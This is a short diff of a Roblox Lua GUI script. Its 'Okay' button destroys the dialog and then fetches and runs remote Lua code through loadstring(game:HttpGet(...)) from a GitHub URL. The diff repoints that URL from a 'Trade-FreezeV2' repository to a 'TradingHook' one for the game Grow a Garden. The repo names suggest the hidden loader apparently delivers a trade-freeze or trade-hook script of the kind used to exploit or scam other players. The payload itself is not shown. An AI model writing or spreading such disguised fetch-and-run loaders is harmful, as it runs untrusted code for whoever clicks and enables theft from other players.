@@ -115,5 +115,5 @@ NameTag.TextXAlignment = Enum.TextXAlignment.Left
 -- Button functionality: destroy GUI + load new script
 OkayButton.MouseButton1Click:Connect(function()
 	ScreenGui:Destroy()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/xiuyeun98878/Trade-FreezeV2/refs/heads/main/GrowAGardenOfficial/lua"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/xiuyeun98878/TradingHook/refs/heads/main/GrowaGardenOfficial/lua"))()
 end)
